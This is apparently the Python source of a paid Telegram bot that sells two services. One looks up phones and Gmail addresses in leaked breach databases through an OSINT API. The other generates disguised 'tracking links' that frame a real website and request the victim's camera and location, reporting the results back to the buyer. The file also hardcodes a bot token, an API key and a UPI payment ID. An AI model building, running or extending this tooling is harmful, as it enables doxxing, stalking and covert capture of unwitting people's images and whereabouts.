import os
import json
import re
import urllib.parse
import logging
import requests
import threading
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# === FLASK WEB SERVER SETUP ===
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Milkshake Bot is running!"

@app.route('/health')
def health():
    return "OK"

@app.route('/ping')
def ping():
    return "Pong!"

def run_web_server():
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# === CONFIGURATION ===
BOT_TOKEN = "8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ"
API_KEY = "5210628714:lMkRuCeC"
LANG = "ru"
LIMIT = 300
URL = "https://leakosintapi.com/"

UPI_ID = "durgeshraihero@oksbi"
QR_IMAGE = "https://ibb.co/fVPGL7rB"
ADMIN_ID = 6314556756

# Costs
COST_LOOKUP = 50
COST_TRACK = 10

# Balances
user_balances = {}   # {user_id: credits}

# Render Link
RENDER_LINK = "https://jsjs-kzua.onrender.com"

# === HELPERS ===
def format_as_js(data):
    js_lines = []
    for key, value in data.items():
        key_str = key
        value_str = json.dumps(value, ensure_ascii=False)
        js_lines.append(f"{key_str}: {value_str}")
    return "{\n" + ",\n".join(js_lines) + "\n}"

def generate_report(query):
    data = {"token": API_KEY, "request": query.strip(), "limit": LIMIT, "lang": LANG}
    try:
        response = requests.post(URL, json=data).json()
    except Exception as e:
        return f"❌ API ERROR: {e}"

    if "Error code" in response:
        return f"🚫 API Error: {response['Error code']}"

    output = []
    for db in response.get("List", {}).keys():
        db_title = "Darkhackerv99" if db.lower() == "1win" else db
        output.append(f"\n📂 <b>DATABASE:</b> {db_title}\n")
        if db != "No results found":
            for entry in response["List"][db]["Data"]:
                formatted = format_as_js(entry)
                output.append(f"<pre>{formatted}</pre>")

    return "\n".join(output) if output else "⚠️ No results found."

def make_personal_link(chat_id: int, site: str) -> str:
    encoded = urllib.parse.quote(site, safe="")
    return f"{RENDER_LINK}/?chat_id={chat_id}&site={encoded}"

def check_site_embeddable(url: str):
    SIMPLE_URL_RE = re.compile(r"^https://[^\s/$.?#].[^\s]*$", re.IGNORECASE)
    if not url.lower().startswith("https://"):
        return False, "Only HTTPS URLs are supported."
    if not SIMPLE_URL_RE.match(url):
        return False, "Invalid URL format."

    headers = {"User-Agent": "Site-Frame-Validator/1.0"}
    try:
        resp = requests.head(url, headers=headers, timeout=10, allow_redirects=True)
        if resp.status_code >= 400:
            resp = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
    except Exception:
        return False, "⚠️ Could not connect to site."

    if resp.status_code >= 400:
        return False, f"HTTP {resp.status_code}"

    content_type = resp.headers.get("content-type", "")
    if "text/html" not in content_type.lower():
        return False, f"Invalid Content-Type: {content_type}"

    xfo = resp.headers.get("x-frame-options", "")
    if xfo and ("deny" in xfo.lower() or "sameorigin" in xfo.lower()):
        return False, "Blocked by X-Frame-Options"

    csp = resp.headers.get("content-security-policy", "")
    if "frame-ancestors" in csp.lower():
        return False, "Blocked by CSP"

    return True, "OK"

# === COMMANDS ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("📲 Phone/Gmail Lookup (₹50)", callback_data="service_lookup")],
        [InlineKeyboardButton("🌍 Track via Website (₹10)", callback_data="service_track")],
        [InlineKeyboardButton("💳 Add Balance", callback_data="buy")],
        [InlineKeyboardButton("💰 Check Balance", callback_data="balance")],
        [InlineKeyboardButton("👨‍💻 Contact Admin", url=f"tg://user?id={ADMIN_ID}")]
    ]
    await update.message.reply_text(
        f"👋 <b>Welcome {user.first_name}!</b>\n\n"
        "I'm your <b>Milkshake Bot</b>, ready to fetch hidden details and give you powerful tools.\n\n"
        "✨ Available Services:\n"
        f"• 📲 Phone/Gmail Lookup → <b>₹{COST_LOOKUP}</b>\n"
        f"• 🌍 Tracking via Website → <b>₹{COST_TRACK}</b>\n\n"
        "Choose wisely, and let's get started ⬇️",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML"
    )

async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💳 <b>Recharge Instructions</b>\n\n"
        f"📌 <b>UPI ID:</b> <code>{UPI_ID}</code>\n"
        "⚠️ Amount must be multiple of ₹20.\n\n"
        f"📲 Phone/Gmail Lookup = <b>₹{COST_LOOKUP}</b>\n"
        f"🌍 Track via Website = <b>₹{COST_TRACK}</b>\n\n"
        "📤 Send screenshot of payment here. Once verified, credits will be added."
    )
    chat = update.message or update.callback_query.message
    await chat.reply_photo(QR_IMAGE, caption=text, parse_mode="HTML")

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    bal = user_balances.get(user_id, 0)
    chat = update.message or update.callback_query.message
    await chat.reply_text(
        f"💰 <b>Your Current Balance:</b> {bal} credits\n\n"
        "✨ Remember: Keep your balance loaded so you can instantly unlock secrets 🔍",
        parse_mode="HTML"
    )

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])
        user_balances[user_id] = user_balances.get(user_id, 0) + amount
        await update.message.reply_text(
            f"✅ Successfully added {amount} credits to User <code>{user_id}</code>",
            parse_mode="HTML"
        )
    except:
        await update.message.reply_text("⚠️ Usage: /approve <user_id> <amount>")

# === SERVICE 1 ===
async def service_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["awaiting_lookup"] = True
    await update.callback_query.message.reply_text(
        f"📲 <b>Phone/Gmail Lookup</b>\n\n"
        f"Cost: <b>{COST_LOOKUP} credits</b>\n\n"
        "👉 Enter the phone number or Gmail you want to investigate.\n"
        "📌 For Indian numbers, use <code>+91XXXXXXXXXX</code> format.\n\n"
        "💡 Pro Tip: Just type any number or email and I'll decode the hidden details. You'll be surprised 😉",
        parse_mode="HTML"
    )

# === SERVICE 2 ===
async def service_track(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["awaiting_track"] = True
    await update.callback_query.message.reply_text(
        f"🌍 <b>Website Tracking Service</b>\n\n"
        f"Cost: <b>{COST_TRACK} credits</b>\n\n"
        "🔗 Send me a full HTTPS URL (example: <code>https://example.com</code>).\n\n"
        "I'll generate a special link which, when opened, can request camera & location access 📡",
        parse_mode="HTML"
    )

# === Handle messages ===
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # Phone/Gmail Lookup
    if context.user_data.get("awaiting_lookup"):
        bal = user_balances.get(user_id, 0)
        if bal < COST_LOOKUP:
            await update.message.reply_text("⚠️ Not enough balance. Please recharge first.")
            return
        user_balances[user_id] -= COST_LOOKUP
        context.user_data["awaiting_lookup"] = False
        result = generate_report(text)
        for chunk in [result[i:i+4000] for i in range(0, len(result), 4000)]:
            await update.message.reply_text(chunk, parse_mode="HTML")
        return

    # Track via Website
    if context.user_data.get("awaiting_track"):
        bal = user_balances.get(user_id, 0)
        if bal < COST_TRACK:
            await update.message.reply_text("⚠️ Not enough balance. Please recharge first.")
            return
        context.user_data["awaiting_track"] = False
        user_balances[user_id] -= COST_TRACK

        await update.message.reply_text("🔎 Checking site compatibility, please wait...")
        try:
            ok, reason = check_site_embeddable(text)
        except:
            await update.message.reply_text("⚠️ Unexpected error while validating site.")
            return

        if not ok:
            await update.message.reply_text(f"❌ Cannot embed site: {reason}")
            return

        personal = make_personal_link(user_id, text)
        await update.message.reply_text(
            f"✅ Site is valid!\n\nHere's your personal tracking link:\n\n<code>{personal}</code>",
            parse_mode="HTML"
        )
        return

# === Buttons ===
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "buy":
        await buy(update, context)
    elif query.data == "balance":
        await balance(update, context)
    elif query.data == "service_lookup":
        await service_lookup(update, context)
    elif query.data == "service_track":
        await service_track(update, context)

# === MAIN ===
def main():
    # Start web server in a separate thread
    server_thread = threading.Thread(target=run_web_server, daemon=True)
    server_thread.start()
    
    # Start Telegram bot
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_handler))

    # forward payment proofs
    application.add_handler(MessageHandler(filters.PHOTO, lambda u, c: u.message.forward(ADMIN_ID)))
    application.add_handler(MessageHandler(filters.Document.ALL, lambda u, c: u.message.forward(ADMIN_ID)))

    print("🤖 Bot is running with web server...")
    application.run_polling()

if __name__ == "__main__":
    main()
